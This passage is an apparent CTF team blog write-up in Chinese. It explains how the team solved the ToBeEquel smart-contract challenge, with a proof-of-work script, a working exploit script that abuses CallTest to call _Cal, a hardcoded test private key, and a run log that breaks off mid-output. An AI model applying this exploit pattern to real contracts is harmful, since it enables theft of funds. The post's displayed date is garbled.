<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>第五届“强网”拟态防御国际精英挑战赛 SU Writeup -</title><meta name=description content="感谢队里师傅们的辛苦付出,尤其是深海师傅@B1ue1nWh1te，考试中抽空第一个ak了区块链赛题！
同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
以下是我们 SU 本次 强网拟态防御国际精英挑战赛 的 writeup"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/ntfy-2022-su-wu\/","name":"第五届“强网”拟态防御国际精英挑战赛 su writeup"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"第五届“强网”拟态防御国际精英挑战赛 SU Writeup","description":"感谢队里师傅们的辛苦付出,尤其是深海师傅@B1ue1nWh1te，考试中抽空第一个ak了区块链赛题！ 同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770) 以下是我们 SU 本次 强网拟态防御国际精英挑战赛 的 writeup\n","inLanguage":"en","wordCount":4249,"datePublished":"2022-11-06T18:12:48\u002b00:00","dateModified":"2022-11-06T18:12:48\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["拟态"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/ntfy-2022-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="第五届“强网”拟态防御国际精英挑战赛 SU Writeup"><meta property="og:description" content="感谢队里师傅们的辛苦付出,尤其是深海师傅@B1ue1nWh1te，考试中抽空第一个ak了区块链赛题！
同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
以下是我们 SU 本次 强网拟态防御国际精英挑战赛 的 writeup"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/ntfy-2022-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="第五届“强网”拟态防御国际精英挑战赛 SU Writeup"><meta name=twitter:description content="感谢队里师傅们的辛苦付出,尤其是深海师傅@B1ue1nWh1te，考试中抽空第一个ak了区块链赛题！
同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
以下是我们 SU 本次 强网拟态防御国际精英挑战赛 的 writeup"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href="https://su-team.cn/css/codeblock.css?v=20260212-fix3"><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>第五届“强网”拟态防御国际精英挑战赛 SU Writeup</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on November 6, 61148
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;20&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;4249&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#blockchain>BlockChain</a><ul><li><a href=#tobeequel>ToBeEquel</a><ul><li><a href=#题目描述>题目描述</a><ul><li><a href=#解题过程>解题过程</a></li></ul></li></ul></li><li><a href=#nft-revenge>NFT Revenge</a><ul><li><a href=#题目描述-1>题目描述</a></li><li><a href=#解题过程-1>解题过程</a></li></ul></li></ul></li><li><a href=#pwn>pwn</a><ul><li><a href=#webheap_revenge>webheap_revenge</a></li><li><a href=#bfbf>bfbf</a></li><li><a href=#webheap>webheap</a></li><li><a href=#store>store</a></li></ul></li><li><a href=#rev>Rev</a><ul><li><a href=#comeongo>comeongo</a></li><li><a href=#windows_call>windows_call</a></li></ul></li><li><a href=#mimic>mimic</a><ul><li><a href=#web_mimic>web_mimic</a></li><li><a href=#pwn2-1>pwn2-1</a></li><li><a href=#pwn1>pwn1</a></li><li><a href=#pwn1-1>pwn1-1</a></li></ul></li><li><a href=#web>web</a><ul><li><a href=#ezus>ezus</a></li><li><a href=#没有人比我更懂py>没有人比我更懂py</a></li><li><a href=#popsql>popsql</a></li></ul></li><li><a href=#misc>misc</a><ul><li><a href=#babymisc>babymisc</a></li><li><a href=#black-sheep-wall>Black sheep wall</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>感谢队里师傅们的辛苦付出,尤其是深海师傅<code>@B1ue1nWh1te</code>，考试中抽空第一个ak了区块链赛题！
同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)
以下是我们 SU 本次 强网拟态防御国际精英挑战赛 的 writeup</p><h1 id=blockchain>BlockChain</h1><p>深海师傅 原文地址 <a href=https://www.seaeye.cn/archives/487.html>https://www.seaeye.cn/archives/487.html</a></p><h2 id=tobeequel>ToBeEquel</h2><h3 id=题目描述>题目描述</h3><p><img src=https://img.seaeye.cn/img/qwnt2022/1.png alt=1></p><p><img src=https://img.seaeye.cn/img/qwnt2022/2.png alt=2></p><p><a href=https://img.seaeye.cn/file/qwnt2022/ToBeEquel.sol>合约文件</a></p><h4 id=解题过程>解题过程</h4><p>首先使用<code>nc 140.210.195.172 10001</code>连接服务器看看情况，发现需要先进行<code>工作量证明</code>，使用<code>Poseidon.PoW</code>模块即可，直接给出以下脚本<code>pow.py</code>。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/3.png alt=3></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Poseidon.PoW</span> <span class=kn>import</span> <span class=n>PoWUtils</span>   <span class=c1># https://github.com/B1ue1nWh1te/Poseidon</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Connection</span> <span class=o>=</span> <span class=n>PoWUtils</span><span class=o>.</span><span class=n>ProofOfWork_SHA256_EndWithZero</span><span class=p>(</span><span class=s2>&#34;140.210.195.172&#34;</span><span class=p>,</span> <span class=mi>10001</span><span class=p>,</span> <span class=s2>&#34;sha256(&#34;</span><span class=p>,</span> <span class=s2>&#34;+?)&#34;</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>20</span><span class=p>,</span> <span class=s2>&#34;?=&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>执行<code>python3 pow.py</code>，成功进入题目环境。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/4.png alt=4></p><p>进入<code>Option 4</code>，获取<code>合约源代码</code>（已附在题目描述中）。</p><p>进入<code>Option 1</code>，创建<code>Deployer</code>账户。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/5.png alt=5></p><p>访问<code>http://140.210.195.172/</code>，为该账户领取测试币以发起交易。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/6.png alt=6></p><p>进入<code>Option 2</code>，部署题目合约，记录下<code>Transaction hash</code>以获取<code>合约地址</code>。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/7.png alt=7></p><p>下面开始对合约进行分析，首先看到解出条件，需要满足<code>owner</code>的代币余额与我们账户的代币余额相等。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/8.png alt=8></p><p>然后发现<code>owner</code>的最初余额有<code>500</code>，并且通过<code>_Cal</code>函数可以实现余额的修改，但是需要调用者为<code>合约部署者</code>或<code>合约自身</code>。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/9.png alt=9></p><p><img src=https://img.seaeye.cn/img/qwnt2022/10.png alt=10></p><p>最后发现关键函数<code>CallTest</code>，它允许我们以<code>题目合约的身份</code>调用一个外部合约的自定义函数。一开始我以为是<code>函数选择器碰撞</code>类型，但发现这题不需要这么麻烦，直接传目的函数即可。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/11.png alt=11></p><p>那么我们只需要将<code>to</code>设置为<code>题目合约地址</code>，<code>customFallback</code>设置为<code>_Cal(uint256,uint256)</code>即可进行余额的修改。但需要注意的是参数的编码问题，在<code>abi.encodeWithSignature(customFallback, msg.sender, data)</code>中对<code>CallTest</code>的调用者地址和传入的<code>data</code>值也进行了编码，这两个值将会作为函数参数<code>(uint256,uint256)</code>传入<code>_Cal</code>函数，我们需要对其进行构造。</p><p>经过测试我发现当<code>data</code>传入<code>0x</code>，即传入空值时，第二个<code>uint256</code>的值也就是<code>amount</code>参数的值会变为<code>0x40</code>，那么我们每调用一次<code>_Cal</code>，自己账户的代币余额就会增加<code>64</code>，而合约账户的代币余额减少的值与我们账户地址的两位后缀有关(从<code>value & 0xff</code>得知，<code>value</code>的值即为我们的账户地址)。但由于合约的余额每一次最多减少<code>0xff</code>，而我们的余额每一次最多增加<code>0x40</code>，所以考虑使用两次调用<code>_Cal</code>来实现余额相等。</p><p>经过上述分析得到这一方程：<code>500-2x=64*2</code>，解得<code>x=186</code>，即十六进制的<code>0xba</code>，所以我们需要使用<a href=https://vanity-eth.tk/>虚荣地址生成器</a>来生成账户地址最后两位为<code>ba</code>的账户。使用这个账户来调用<code>_Cal</code>就可以实现每次合约的余额减少<code>186</code>，我们自己的余额增加<code>64</code>，两次后即可相等为<code>128</code>。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/12.png alt=12></p><p>同样也给这个账户领取测试币用于发送链上交易，之后根据上述过程编写脚本进行攻击即可，使用<code>Poseidon.Blockchain</code>模块。代码中有详细注释。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Poseidon.Blockchain</span> <span class=kn>import</span> <span class=o>*</span>   <span class=c1># https://github.com/B1ue1nWh1te/Poseidon</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 连接至链</span>
</span></span><span class=line><span class=cl><span class=n>chain</span> <span class=o>=</span> <span class=n>Chain</span><span class=p>(</span><span class=s2>&#34;http://140.210.195.172:8545&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 导入账户</span>
</span></span><span class=line><span class=cl><span class=n>account</span> <span class=o>=</span> <span class=n>Account</span><span class=p>(</span><span class=n>chain</span><span class=p>,</span> <span class=s2>&#34;13b0708eeaea2b2ec752d18f9e71780c3a51d29e3c6944ab171b1a568a4f01c3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 选择 Solidity 版本</span>
</span></span><span class=line><span class=cl><span class=n>BlockchainUtils</span><span class=o>.</span><span class=n>SwitchSolidityVersion</span><span class=p>(</span><span class=s2>&#34;0.6.12&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 编译题目合约</span>
</span></span><span class=line><span class=cl><span class=n>abi</span><span class=p>,</span> <span class=n>bytecode</span> <span class=o>=</span> <span class=n>BlockchainUtils</span><span class=o>.</span><span class=n>Compile</span><span class=p>(</span><span class=s2>&#34;target.sol&#34;</span><span class=p>,</span> <span class=s2>&#34;ToBeEquel&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 获取题目合约地址</span>
</span></span><span class=line><span class=cl><span class=n>contractAddress</span> <span class=o>=</span> <span class=n>chain</span><span class=o>.</span><span class=n>Net</span><span class=o>.</span><span class=n>eth</span><span class=o>.</span><span class=n>get_transaction_receipt</span><span class=p>(</span><span class=s2>&#34;0x50bf4afa76ce9071edec120f1901f6e56563255efdcae485a6c3d55a38ac9ca4&#34;</span><span class=p>)[</span><span class=s2>&#34;contractAddress&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 实例化合约</span>
</span></span><span class=line><span class=cl><span class=n>contract</span> <span class=o>=</span> <span class=n>Contract</span><span class=p>(</span><span class=n>account</span><span class=p>,</span> <span class=n>contractAddress</span><span class=p>,</span> <span class=n>abi</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 查询余额</span>
</span></span><span class=line><span class=cl><span class=n>contract</span><span class=o>.</span><span class=n>ReadOnlyCallFunction</span><span class=p>(</span><span class=s2>&#34;balances&#34;</span><span class=p>,</span> <span class=s2>&#34;0x5799812Cc367Aa90073cba2a1D8f2141547A631b&#34;</span><span class=p>)</span>  <span class=c1># 合约部署者即 owner</span>
</span></span><span class=line><span class=cl><span class=n>contract</span><span class=o>.</span><span class=n>ReadOnlyCallFunction</span><span class=p>(</span><span class=s2>&#34;balances&#34;</span><span class=p>,</span> <span class=n>account</span><span class=o>.</span><span class=n>Address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 攻击两次以使余额相等（均为128）</span>
</span></span><span class=line><span class=cl><span class=n>contract</span><span class=o>.</span><span class=n>CallFunction</span><span class=p>(</span><span class=s2>&#34;CallTest&#34;</span><span class=p>,</span> <span class=n>contractAddress</span><span class=p>,</span> <span class=s2>&#34;_Cal(uint256,uint256)&#34;</span><span class=p>,</span> <span class=s2>&#34;0x&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>contract</span><span class=o>.</span><span class=n>CallFunction</span><span class=p>(</span><span class=s2>&#34;CallTest&#34;</span><span class=p>,</span> <span class=n>contractAddress</span><span class=p>,</span> <span class=s2>&#34;_Cal(uint256,uint256)&#34;</span><span class=p>,</span> <span class=s2>&#34;0x&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 再次查询余额</span>
</span></span><span class=line><span class=cl><span class=n>contract</span><span class=o>.</span><span class=n>ReadOnlyCallFunction</span><span class=p>(</span><span class=s2>&#34;balances&#34;</span><span class=p>,</span> <span class=s2>&#34;0x5799812Cc367Aa90073cba2a1D8f2141547A631b&#34;</span><span class=p>)</span>  <span class=c1># 合约部署者即 owner</span>
</span></span><span class=line><span class=cl><span class=n>contract</span><span class=o>.</span><span class=n>ReadOnlyCallFunction</span><span class=p>(</span><span class=s2>&#34;balances&#34;</span><span class=p>,</span> <span class=n>account</span><span class=o>.</span><span class=n>Address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 触发 ForFlag 事件</span>
</span></span><span class=line><span class=cl><span class=n>contract</span><span class=o>.</span><span class=n>CallFunction</span><span class=p>(</span><span class=s2>&#34;getFlag&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>运行日志如下（这是写题解复现时的数据）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>10.725</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>__init__</span><span class=p>:</span><span class=mi>32</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Chain</span><span class=p>][</span><span class=n>Connect</span><span class=p>]</span><span class=n>Successfully</span> <span class=n>connected</span> <span class=n>to</span> <span class=p>[</span><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>140.210</span><span class=o>.</span><span class=mf>195.172</span><span class=p>:</span><span class=mi>8545</span><span class=p>]</span><span class=o>.</span> <span class=p>[</span><span class=n>Delay</span><span class=p>]</span> <span class=mi>141</span> <span class=n>ms</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>10.749</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>__init__</span><span class=p>:</span><span class=mi>241</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>Import</span><span class=p>]</span><span class=n>Successfully</span> <span class=n>import</span> <span class=n>account</span> <span class=p>[</span><span class=mh>0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba</span><span class=p>]</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>10.844</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>GetBalance</span><span class=p>:</span><span class=mi>122</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Chain</span><span class=p>][</span><span class=n>GetBalance</span><span class=p>][</span><span class=mh>0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba</span><span class=p>]</span>
